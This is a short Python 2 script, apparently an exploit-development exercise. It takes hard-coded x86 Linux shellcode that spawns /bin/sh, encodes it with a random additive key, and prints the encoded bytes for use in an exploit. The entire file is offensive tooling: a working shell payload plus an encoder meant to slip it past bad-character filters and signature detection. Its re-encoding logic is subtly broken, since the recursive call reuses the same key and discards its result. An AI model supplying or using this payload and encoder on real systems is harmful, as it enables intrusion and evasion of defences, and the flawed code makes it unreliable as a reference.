#!/bin/python

payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
shellcode = bytearray()
shellcode.extend(payload)

# get length of shellcode
len_shellcode = len(shellcode)

# if the shellcode length is odd append nop
if len_shellcode % 2 == 1:
    shellcode.append("\x90")

bad_chars = ["\x00"]

# Generate Random Key
import random
r = random.randint(2,44)
key = int(r)

def encoder():
    encode_shellcode = bytearray()
    for i in range(0, len_shellcode, 2):
        byte_1 = shellcode[i]
        byte_2 = shellcode[i+1]
        byte_1 = (byte_1 + key) % 256
        byte_2 = (byte_2 + key) % 256
        encode_shellcode.append(byte_1)
        encode_shellcode.append(byte_2)
        for i in bad_chars:
            if encode_shellcode.find(i) >= 0:
                print("Illegal Char found , re-encoding...)")
                encoder()

    return encode_shellcode


encoded_bytes = ""
encoded_shellcode = encoder()
encoded_shellcode.append(key)
for byte_ in encoded_shellcode:
    len_enc = len(str(hex(byte_)))
    if len_enc == 3:
        encoded_bytes += str(hex(byte_)[:2])+"0"+str(hex(byte_)[2:])+","
    else:
        encoded_bytes += str(hex(byte_))+","

encoded = encoded_bytes[:-1]
print "[*] Size of encoded shellcode is: "+str(len(encoded_shellcode))
print "[*] Encoded Shellcode is: "+encoded_bytes
